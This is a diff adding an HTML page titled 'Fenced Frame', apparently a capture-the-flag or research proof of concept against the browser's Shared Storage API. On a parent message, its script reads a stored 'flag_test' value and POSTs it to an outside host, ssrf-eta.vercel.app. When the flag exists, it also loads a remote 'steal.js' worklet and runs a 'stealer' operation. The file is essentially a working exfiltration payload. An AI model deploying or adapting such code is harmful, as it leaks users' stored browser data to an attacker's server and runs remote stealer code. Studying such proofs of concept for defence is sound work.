@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fenced Frame</title>
+</head>
+<body>
+  <script>
+    // Wait for the message from the parent and start the exfiltration process
+    window.addEventListener('message', async (event) => {
+      if (event.data === 'start') {
+        try {
+          const flag = await sharedStorage.get("flag_test");
+
+          // Prepare the data to send to the capture endpoint
+          const dataToSend = flag || "no flag yet"; // If flag exists, use it, else use default value.
+
+          // Send the flag (or default) to https://ssrf-eta.vercel.app/api/capture
+          await fetch("https://ssrf-eta.vercel.app/api/capture", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ flag: dataToSend })
+          });
+
+          console.log("Sent flag to capture endpoint.");
+
+          // If flag_test exists, run the stealer
+          if (flag) {
+            sharedStorage.worklet.addModule("https://ssrf-eta.vercel.app/steal.js");
+            sharedStorage.run("stealer");
+            console.log("Running stealer to exfil flag.");
+          } else {
+            // If no flag_test exists, set it to the default value
+            await sharedStorage.set("flag_test", "maybe");
+            console.log("SharedStorage flag_test set to default value.");
+          }
+        } catch (err) {
+          console.error("Error during exfiltration:", err);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
